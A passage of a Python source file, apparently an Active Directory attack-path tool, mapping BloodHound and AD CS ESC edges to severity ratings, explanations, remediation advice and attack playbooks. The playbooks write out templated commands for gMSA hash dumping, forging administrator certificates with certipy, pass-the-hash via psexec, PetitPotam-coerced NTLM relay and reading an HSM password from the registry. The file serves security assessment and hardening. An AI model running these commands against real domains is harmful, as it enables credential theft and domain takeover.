                "# Dump gMSA password hash\\npython3 gMSADumper.py -u '<DOMAIN_USER>' -p '<PASSWORD>' -d <DOMAIN> -dc-ip <DC_IP>",
                "# Alternative: NetExec\\nnxc ldap <DC_IP> -u '<DOMAIN_USER>' -p '<PASSWORD>' -M gmsa",
                "# Authenticate with the recovered NT hash\\nimpacket-psexec <DOMAIN>/<GMSA_ACCOUNT>@<TARGET_HOST> -hashes :<NT_HASH>",
            ],
        },
        "remediation": (
            "Audit PrincipalsAllowedToRetrieveManagedPassword on every gMSA. Restrict "
            "read access to only the servers that run the gMSA service. Remove broad "
            "groups like 'Domain Computers' from the allowed list."
        ),
    },

    # ── AD CS (Active Directory Certificate Services) edges ───────────────
    "ADCS_ESC1": {
        "severity": Severity.CRITICAL,
        "short": "Certificate template allows SAN specification with Client Auth EKU",
        "eli5": (
            "ESC1 is the most straightforward AD CS abuse: a certificate template has "
            "both Client Authentication EKU and ENROLLEE_SUPPLIES_SUBJECT enabled, "
            "meaning any enrolling user can specify an arbitrary Subject Alternative "
            "Name (SAN). Request a certificate with 'administrator@domain.local' as "
            "the SAN, authenticate with it via PKINIT, and you ARE the Domain Admin. "
            "No password resets, no noisy group changes — just a certificate request. "
            "Defenders: disable ENROLLEE_SUPPLIES_SUBJECT on every template that has "
            "Client Auth EKU."
        ),
        "playbooks": {
            "user": [
                "certipy req -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -upn administrator@<DOMAIN> -dc-ip <DC_IP>",
                "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
                "# Use the recovered NT hash\\nimpacket-psexec <DOMAIN>/administrator@<DC_HOST> -hashes :<NT_HASH>",
            ],
        },
        "remediation": (
            "Disable ENROLLEE_SUPPLIES_SUBJECT on all templates with Client Authentication "
            "EKU. Restrict enrollment permissions to specific service accounts. "
            "Run 'certipy find -vulnerable' to audit."
        ),
    },

    "ADCS_ESC2": {
        "severity": Severity.HIGH,
        "short": "Certificate template with Any Purpose or no EKU — acts as wildcard",
        "eli5": (
            "ESC2 templates have either 'Any Purpose' EKU or no EKU at all. Both "
            "conditions mean the certificate can be used for *anything* — including "
            "Client Authentication. Combined with enrollment rights, this is effectively "
            "an ESC1 variant."
        ),
        "playbooks": {
            "user": [
                "certipy req -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -dc-ip <DC_IP>",
            ],
        },
        "remediation": "Replace Any Purpose / empty EKU with the specific EKU the business requires.",
    },

    "ADCS_ESC3": {
        "severity": Severity.HIGH,
        "short": "Enrollment Agent template — request certs on behalf of others",
        "eli5": (
            "ESC3 templates have the Certificate Request Agent (Enrollment Agent) EKU. "
            "An attacker with enrollment rights can request a certificate, then use it "
            "to request another certificate *on behalf of* a different user (like a DA). "
            "Two-step impersonation."
        ),
        "playbooks": {
            "user": [
                "certipy req -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -dc-ip <DC_IP>",
                "certipy req -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -template User -on-behalf-of '<DOMAIN>\\\\administrator' -pfx enrollment_agent.pfx -dc-ip <DC_IP>",
            ],
        },
        "remediation": "Restrict Enrollment Agent templates. Add enrollment agent restrictions on the CA.",
    },

    "ADCS_ESC4": {
        "severity": Severity.CRITICAL,
        "short": "Write permissions on certificate template — overwrite to ESC1",
        "eli5": (
            "ESC4 means you have write access (GenericAll/GenericWrite/WriteDacl/WriteOwner) "
            "on a certificate template object. You can rewrite the template to enable "
            "ENROLLEE_SUPPLIES_SUBJECT and Client Auth EKU, turning it into ESC1. Then "
            "request a certificate as Domain Admin."
        ),
        "playbooks": {
            "certtemplate": [
                "# Save the original template, modify it to ESC1, exploit, then restore\\ncertipy template -u '<DOMAIN_USER>' -p '<PASSWORD>' -template '<TEMPLATE_NAME>' -save-old -dc-ip <DC_IP>",
                "certipy req -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -template '<TEMPLATE_NAME>' -upn administrator@<DOMAIN> -dc-ip <DC_IP>",
            ],
        },
        "remediation": "Audit ACLs on certificate template objects. Only CA Admins should have write access.",
    },

    "ADCS_ESC6": {
        "severity": Severity.CRITICAL,
        "short": "CA has EDITF_ATTRIBUTESUBJECTALTNAME2 flag — every template is ESC1",
        "eli5": (
            "ESC6 means the Certificate Authority has the EDITF_ATTRIBUTESUBJECTALTNAME2 "
            "flag enabled. This flag allows ANY certificate request to include an arbitrary "
            "SAN in the request attributes, regardless of the template configuration. "
            "Effectively, every template on this CA becomes ESC1."
        ),
        "playbooks": {
            "ca": [
                "certipy req -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -template User -upn administrator@<DOMAIN> -dc-ip <DC_IP>",
                "certipy auth -pfx administrator.pfx -dc-ip <DC_IP>",
            ],
        },
        "remediation": (
            "Disable the EDITF_ATTRIBUTESUBJECTALTNAME2 flag: "
            "certutil -config 'CA_HOST\\CA_NAME' -setreg policy\\EditFlags "
            "-EDITF_ATTRIBUTESUBJECTALTNAME2. Restart the CA service."
        ),
    },

    "ADCS_ESC7": {
        "severity": Severity.CRITICAL,
        "short": "ManageCA or ManageCertificates rights on the CA",
        "eli5": (
            "ESC7 means you hold ManageCA or ManageCertificates on the CA. ManageCA lets "
            "you enable the EDITF flag (creating ESC6) or add yourself as an officer. "
            "ManageCertificates lets you approve pending certificate requests. Both lead "
            "to full domain takeover via certificate abuse."
        ),
        "playbooks": {
            "ca": [
                "# Enable SubCA template and enable EDITF flag\\ncertipy ca -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -enable-template SubCA -dc-ip <DC_IP>",
                "certipy req -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -template SubCA -upn administrator@<DOMAIN> -dc-ip <DC_IP>",
                "certipy ca -u '<DOMAIN_USER>' -p '<PASSWORD>' -ca '<CA_NAME>' -issue-request <REQUEST_ID> -dc-ip <DC_IP>",
            ],
        },
        "remediation": "Restrict ManageCA and ManageCertificates to CA Admins only. Audit CA permissions.",
    },

    "ADCS_ESC8": {
        "severity": Severity.HIGH,
        "short": "HTTP enrollment endpoint — NTLM relay to CA",
        "eli5": (
            "ESC8 is an NTLM relay attack against the CA's HTTP enrollment endpoint "
            "(Web Enrollment / CES / CEP). Coerce a DC or admin to authenticate to you "
            "(PetitPotam, PrinterBug), then relay their NTLM authentication to the CA's "
            "HTTP enrollment endpoint to request a certificate as that principal."
        ),
        "playbooks": {
            "ca": [
                "# Set up relay\\ncertipy relay -target 'http://<CA_HOST>/certsrv/certfnsh.asp' -ca '<CA_NAME>' -template DomainController",
                "# Coerce DC auth\\npython3 PetitPotam.py -u '<DOMAIN_USER>' -p '<PASSWORD>' <ATTACKER_HOST> <DC_IP>",
            ],
        },
        "remediation": (
            "Disable HTTP enrollment. If required, enable EPA (Extended Protection for "
            "Authentication) and require HTTPS with channel binding. Patch DCs against "
            "PetitPotam (KB5005413)."
        ),
    },

    "ADCS_ESC11": {
        "severity": Severity.HIGH,
        "short": "AD CS ESC11 - NTLM Relay to CA RPC/DCOM interface",
        "eli5": (
            "ESC11 occurs when a Certificate Authority (CA) does not require RPC encryption for "
            "certificate request interfaces (e.g. enforceencryptionforrequests is False or "
            "IF_ENFORCEENCRYPTICERTREQUEST is not set). This allows an attacker to coerce NTLM "
            "authentication from a domain controller or other privileged computer, relay it to "
            "the CA's RPC/DCOM interface, and request a certificate to impersonate any user, "
            "including Domain Admins."
        ),
        "playbooks": {
            "ca": [
                "certipy relay -target rpc://<CA_HOST> -ca '<CA_NAME>' -template DomainController",
            ],
        },
        "remediation": (
            "Enable RPC encryption on the Certificate Authority by running: "
            "`certutil -setreg CA\\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST` "
            "and restarting the Active Directory Certificate Services service."
        ),
    },

    "ADCS_ESC12": {
        "severity": Severity.HIGH,
        "short": "AD CS ESC12 - CA Certificate Key Stored in YubiHSM with exposed credentials",
        "eli5": (
            "ESC12 is a configuration risk where the Certificate Authority uses a YubiHSM/HSM "
            "for private key storage, but the YubiHSM Key Storage Provider credentials "
            "are stored in plaintext in the Windows Registry (AuthKeysetPassword). "
            "An attacker with local unprivileged access to the CA server can extract "
            "these credentials, authenticate to the YubiHSM, access the CA's private key, "
            "and forge arbitrary certificates to escalate privileges."
        ),
        "playbooks": {
            "ca": [
                "reg query HKLM\\SOFTWARE\\Yubico\\YubiHSM\\ /v AuthKeysetPassword",
            ],
        },
        "remediation": (
            "Avoid storing HSM authentication credentials in plaintext within the registry. "
            "Audit and restrict read access to HKLM\\SOFTWARE\\Yubico\\YubiHSM\\ registry path."
        ),
    },
}


# ═══════════════════════════════════════════════════════════════════════════════
# HIGH-LEVEL ACCESSORS
# ═══════════════════════════════════════════════════════════════════════════════
def intel_for_right(right: str) -> Dict:
    """Return the intelligence entry for a BloodHound edge/ACL right."""
    return EDGE_INTELLIGENCE.get(
        right,
        {
            "severity": Severity.INFO,
            "short": right,
            "eli5": f"No ELI5 entry registered for '{right}'. Add one to intelligence.EDGE_INTELLIGENCE.",
            "playbooks": {},
            "remediation": "N/A",
        },
    )


def eli5_for(right: str) -> str:
    return intel_for_right(right)["eli5"]


def severity_for(right: str) -> str:
    return intel_for_right(right)["severity"]


def playbooks_for(right: str, target_type: str = "user") -> List[str]:
    pbs = intel_for_right(right).get("playbooks", {})
    return pbs.get(target_type, []) or pbs.get("user", []) or []


def remediation_for(right: str) -> str:
    return intel_for_right(right).get("remediation", "N/A")
